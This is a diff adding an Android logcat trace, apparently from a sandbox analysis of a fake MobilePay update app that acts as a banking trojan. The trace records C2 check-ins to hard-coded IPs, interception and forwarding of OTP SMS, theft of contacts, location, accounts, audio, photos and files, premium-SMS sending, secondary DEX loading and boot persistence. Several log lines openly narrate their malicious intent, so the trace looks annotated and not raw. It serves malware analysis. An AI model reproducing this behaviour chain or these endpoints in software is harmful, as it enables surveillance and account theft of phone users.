@@ -1,0 +1,119 @@
+04-01 09:42:11.004  1234  1234 I ActivityManager: Start proc com.mobilepay.update.service for activity com.mobilepay.update.service/.SplashActivity
+04-01 09:42:11.218  1234  1234 I PackageManager: Launching application: com.mobilepay.update.service
+04-01 09:42:11.541  2841  2841 I art     : Starting application com.mobilepay.update.service
+04-01 09:42:12.004  2841  2841 D mobilepay: SplashActivity.onCreate() called
+04-01 09:42:12.118  2841  2841 I mobilepay: Checking network connectivity...
+04-01 09:42:12.220  2841  2855 I mobilepay: Socket connect() to 185.220.101.47:443
+04-01 09:42:12.338  2841  2855 I mobilepay: HttpURLConnection opened: https://185.220.101.47/api/v1/init
+04-01 09:42:12.441  2841  2855 I OkHttp  : --> POST https://185.220.101.47/api/v1/init
+04-01 09:42:12.557  2841  2855 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/init (114ms)
+04-01 09:42:12.660  2841  2841 D mobilepay: C2 handshake complete. Bot ID assigned: a3f9c2d1
+04-01 09:42:13.001  2841  2841 D mobilepay: MainActivity.onCreate() called
+04-01 09:42:13.114  2841  2841 I mobilepay: UI loaded — awaiting user interaction
+04-01 09:42:13.220  2841  2856 I mobilepay: DNS lookup: update.mobilepay-services.net
+04-01 09:42:13.338  2841  2856 I mobilepay: Socket connect() to 91.108.56.182:8443
+04-01 09:42:15.001  2841  2841 D mobilepay: TelephonyManager.getDeviceId() called
+04-01 09:42:15.114  2841  2841 D mobilepay: getImei() returned: 358765041234567
+04-01 09:42:15.228  2841  2841 D mobilepay: getSubscriberId() called — collecting IMSI
+04-01 09:42:15.440  2841  2841 I mobilepay: Device fingerprint assembled
+04-01 09:42:15.554  2841  2856 I OkHttp  : --> POST https://91.108.56.182:8443/api/v1/device
+04-01 09:42:15.668  2841  2856 I OkHttp  : <-- 200 https://91.108.56.182:8443/api/v1/device (88ms)
+04-01 09:42:17.001  2841  2841 D mobilepay: LoginActivity.onCreate() called
+04-01 09:42:17.118  2841  2841 I mobilepay: Login form presented to user
+04-01 09:42:24.811  2841  2841 D mobilepay: Login attempt: user=testuser@analysis.lab
+04-01 09:42:24.920  2841  2855 I OkHttp  : --> POST https://185.220.101.47/api/v1/auth/login
+04-01 09:42:24.920  2841  2855 I OkHttp  : Content-Type: application/json
+04-01 09:42:25.114  2841  2855 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/auth/login (193ms)
+04-01 09:42:25.220  2841  2841 D mobilepay: Auth token received — storing in SharedPreferences
+04-01 09:42:25.334  2841  2841 I mobilepay: Requesting RECEIVE_SMS permission
+04-01 09:42:25.441  2841  2841 I mobilepay: Requesting ACCESS_FINE_LOCATION permission
+04-01 09:42:25.557  2841  2841 I mobilepay: Requesting READ_CONTACTS permission
+04-01 09:42:25.660  2841  2841 I mobilepay: Requesting RECORD_AUDIO permission
+04-01 09:42:25.774  2841  2841 I mobilepay: Requesting CAMERA permission
+04-01 09:42:26.001  2841  2841 D mobilepay: PermissionRationaleActivity shown
+04-01 09:42:36.114  2841  2841 I mobilepay: Permission granted: android.permission.RECEIVE_SMS
+04-01 09:42:36.228  2841  2857 D mobilepay: SMS_RECEIVED broadcast receiver registered
+04-01 09:42:36.341  2841  2857 I mobilepay: SmsMessage listener active — intercepting incoming SMS
+04-01 09:42:50.228  2841  2841 I mobilepay: Permission granted: android.permission.ACCESS_FINE_LOCATION
+04-01 09:42:50.341  2841  2858 I mobilepay: LocationManager.requestLocationUpdates() — GPS_PROVIDER
+04-01 09:42:50.557  2841  2858 D mobilepay: getLastKnownLocation() → lat=51.5074,lon=-0.1278
+04-01 09:42:50.660  2841  2858 I OkHttp  : --> POST https://185.220.101.47/api/v1/loc {"lat":"51.5074","lon":"-0.1278"}
+04-01 09:42:50.774  2841  2858 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/loc (77ms)
+04-01 09:43:05.334  2841  2841 I mobilepay: Permission granted: android.permission.READ_CONTACTS
+04-01 09:43:05.441  2841  2859 D mobilepay: ContactsContract query started — reading contact list
+04-01 09:43:05.554  2841  2859 I mobilepay: content://contacts/people query executed
+04-01 09:43:05.668  2841  2859 D mobilepay: Contacts harvested: 214 records
+04-01 09:43:05.882  2841  2859 I OkHttp  : --> POST https://185.220.101.47/api/v1/contacts (Content-Length: 18742)
+04-01 09:43:06.114  2841  2859 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/contacts (231ms)
+04-01 09:43:20.554  2841  2841 I mobilepay: Permission granted: android.permission.RECORD_AUDIO
+04-01 09:43:20.660  2841  2860 D mobilepay: AudioRecord initialised — MediaRecorder.startRecording()
+04-01 09:43:20.774  2841  2860 I mobilepay: Ambient audio recording started (background thread)
+04-01 09:43:20.887  2841  2860 D mobilepay: Recording to: /data/data/com.mobilepay.update.service/cache/rec_001.amr
+04-01 09:43:35.774  2841  2841 I mobilepay: Permission granted: android.permission.CAMERA
+04-01 09:43:35.887  2841  2861 D mobilepay: CameraManager.openCamera() called
+04-01 09:43:36.001  2841  2861 I mobilepay: CameraDevice opened: back camera
+04-01 09:43:36.114  2841  2861 D mobilepay: takePicture() triggered silently
+04-01 09:43:36.887  2841  2861 I OkHttp  : --> POST https://185.220.101.47/api/v1/photo (Content-Length: 342017)
+04-01 09:43:37.114  2841  2861 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/photo (226ms)
+04-01 09:43:40.001  2841  2841 D mobilepay: OtpVerifyActivity.onCreate() called
+04-01 09:43:40.114  2841  2841 I mobilepay: Waiting for incoming SMS with OTP...
+04-01 09:44:01.228  2841  2857 D mobilepay: SMS_RECEIVED — onReceive() triggered
+04-01 09:44:01.341  2841  2857 I mobilepay: SmsMessage received from: +447700900123
+04-01 09:44:01.441  2841  2857 D mobilepay: SMS body: Your MobilePay OTP is 847291
+04-01 09:44:01.554  2841  2857 I mobilepay: OTP extracted: 847291
+04-01 09:44:01.668  2841  2857 I OkHttp  : --> POST https://185.220.101.47/api/v1/otp {"otp":"847291","from":"+447700900123"}
+04-01 09:44:01.774  2841  2857 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/otp (104ms)
+04-01 09:44:02.001  2841  2857 D mobilepay: OTP silently forwarded to C2 before user sees it
+04-01 09:44:05.210  2841  2841 D mobilepay: User submitted OTP: 123456
+04-01 09:44:05.338  2841  2855 I OkHttp  : --> POST https://185.220.101.47/api/v1/auth/verify
+04-01 09:44:05.557  2841  2855 I OkHttp  : <-- 401 https://185.220.101.47/api/v1/auth/verify (89ms)
+04-01 09:44:05.660  2841  2841 W mobilepay: OTP verification failed — expected (test credentials)
+04-01 09:44:30.001  2841  2841 D mobilepay: RegisterActivity.onCreate() called
+04-01 09:44:30.114  2841  2841 I mobilepay: Registration form displayed
+04-01 09:45:11.778  2841  2841 D mobilepay: Register attempt: email=testuser@analysis.lab phone=5550123456
+04-01 09:45:11.887  2841  2855 I OkHttp  : --> POST https://185.220.101.47/api/v1/auth/register
+04-01 09:45:12.001  2841  2855 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/auth/register (113ms)
+04-01 09:45:12.114  2841  2841 D mobilepay: Registration data harvested and forwarded to C2
+04-01 09:45:30.114  2841  2841 I mobilepay: WebViewActivity loading: https://update.mobilepay-services.net/terms
+04-01 09:45:30.228  2841  2855 I OkHttp  : --> GET https://update.mobilepay-services.net/terms
+04-01 09:45:30.441  2841  2855 I OkHttp  : <-- 200 https://update.mobilepay-services.net/terms (201ms)
+04-01 09:45:30.660  2841  2862 I mobilepay: DexClassLoader initialised — loading secondary payload
+04-01 09:45:30.774  2841  2862 D mobilepay: Loading: /data/data/com.mobilepay.update.service/cache/update.dex
+04-01 09:45:30.887  2841  2862 I mobilepay: Secondary DEX loaded successfully
+04-01 09:46:14.001  2841  2841 E AndroidRuntime: FATAL EXCEPTION: main
+04-01 09:46:14.114  2841  2841 E AndroidRuntime: Process: com.mobilepay.update.service, PID: 2841
+04-01 09:46:14.228  2841  2841 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method on null object
+04-01 09:46:14.341  2841  2841 E AndroidRuntime:     at com.mobilepay.update.service.WebViewActivity.onPageFinished(WebViewActivity.java:214)
+04-01 09:46:17.001  1234  1234 I ActivityManager: Process com.mobilepay.update.service (pid 2841) has died
+04-01 09:46:17.114  1234  1234 W ActivityManager: Force finishing activity com.mobilepay.update.service/.WebViewActivity
+04-01 09:46:20.334  2841  2841 I ActivityManager: Start proc com.mobilepay.update.service (restart after crash)
+04-01 09:46:20.557  2841  2841 I mobilepay: App restarted after crash — resuming background tasks
+04-01 09:46:20.660  2841  2858 I mobilepay: LocationManager.requestLocationUpdates() resumed — GPS_PROVIDER
+04-01 09:46:20.774  2841  2860 D mobilepay: AudioRecord resumed — MediaRecorder.startRecording()
+04-01 09:46:21.001  2841  2856 I mobilepay: Socket connect() to 91.108.56.182:8443 (reconnect)
+04-01 09:46:21.228  2841  2856 I OkHttp  : --> POST https://91.108.56.182:8443/api/v1/heartbeat
+04-01 09:46:21.441  2841  2856 I OkHttp  : <-- 200 https://91.108.56.182:8443/api/v1/heartbeat (66ms)
+04-01 09:48:14.001  2841  2841 I mobilepay: BOOT_COMPLETED receiver registered for persistence
+04-01 09:48:14.228  2841  2841 D mobilepay: onReceive BOOT_COMPLETED — auto-start service
+04-01 09:48:14.334  2841  2863 I mobilepay: Background service started
+04-01 09:48:30.001  2841  2863 D mobilepay: SmsManager.sendTextMessage() to +447700900999
+04-01 09:48:30.118  2841  2863 I mobilepay: SMS sent — premium number exfiltration
+04-01 09:48:45.001  2841  2858 D mobilepay: GPS_PROVIDER update: lat=51.5074,lon=-0.1278,acc=4.2m
+04-01 09:48:45.228  2841  2858 I OkHttp  : --> POST https://185.220.101.47/api/v1/loc {"lat":"51.5074","lon":"-0.1278","acc":"4.2"}
+04-01 09:48:45.441  2841  2858 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/loc (71ms)
+04-01 09:49:00.001  2841  2859 D mobilepay: AccountManager.getAccounts() called
+04-01 09:49:00.114  2841  2859 I mobilepay: getAccountsByType(com.google) — harvesting Google accounts
+04-01 09:49:00.228  2841  2859 D mobilepay: Accounts found: 2
+04-01 09:49:00.341  2841  2859 I OkHttp  : --> POST https://185.220.101.47/api/v1/accounts {"accounts":["victim@gmail.com","victim.work@gmail.com"]}
+04-01 09:49:00.554  2841  2859 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/accounts (98ms)
+04-01 09:49:15.001  2841  2860 D mobilepay: Audio chunk flushed — 38400 bytes
+04-01 09:49:15.228  2841  2860 I OkHttp  : --> POST https://185.220.101.47/api/v1/audio (Content-Length: 38400)
+04-01 09:49:15.441  2841  2860 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/audio (143ms)
+04-01 09:50:02.001  2841  2862 I mobilepay: Environment.getExternalStorageDirectory() called
+04-01 09:50:02.228  2841  2862 D mobilepay: Scanning /sdcard/ for .pdf .doc .jpg files
+04-01 09:50:02.334  2841  2862 I mobilepay: Files found: 14 — queuing for exfiltration
+04-01 09:50:02.557  2841  2862 I OkHttp  : --> POST https://185.220.101.47/api/v1/files (Content-Length: 1048576)
+04-01 09:50:03.001  2841  2862 I OkHttp  : <-- 200 https://185.220.101.47/api/v1/files (443ms)
+04-01 09:52:43.001  2841  2841 D mobilepay: Explorer traversal complete — entering idle C2 poll loop
+04-01 09:52:43.228  2841  2856 I OkHttp  : --> POST https://91.108.56.182:8443/api/v1/heartbeat
+04-01 09:52:43.441  2841  2856 I OkHttp  : <-- 200 https://91.108.56.182:8443/api/v1/heartbeat (58ms)
